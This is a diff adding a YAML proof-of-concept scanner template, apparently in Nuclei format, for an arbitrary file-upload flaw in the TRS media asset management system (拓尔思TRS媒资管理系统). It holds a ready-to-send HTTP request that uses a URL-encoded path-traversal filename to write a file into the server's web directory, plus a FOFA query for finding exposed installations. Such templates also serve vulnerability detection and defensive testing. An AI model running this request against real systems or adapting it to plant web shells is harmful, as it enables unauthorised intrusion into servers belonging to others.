@@ -1,0 +1,41 @@
+id: poc-hms6cvl0p53vxr25
+info:
+  name: 拓尔思TRS媒资管理系统uploadThumb存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hms6cvl0p53vxr25'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hms6cvl0p53vxr25
+    fofa: '"TRS媒资管理系统"'
+http:
+- raw:
+  - 'POST /mas/servlets/uploadThumb?appKey=sv&uploadingId=asd HTTP/1.1
+
+    Accept: */*
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
+
+    Connection: close
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+
+    ------WebKitFormBoundarySl8siBbmVicABvTX
+
+    Content-Disposition: form-data; name="file";
+
+    filename="%2e%2e%2fwebapps%2fmas%2fa%2etxt"
+
+    Content-Type: application/octet-stream
+
+
+    1234
+
+    ------WebKitFormBoundarySl8siBbmVicABvTX--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
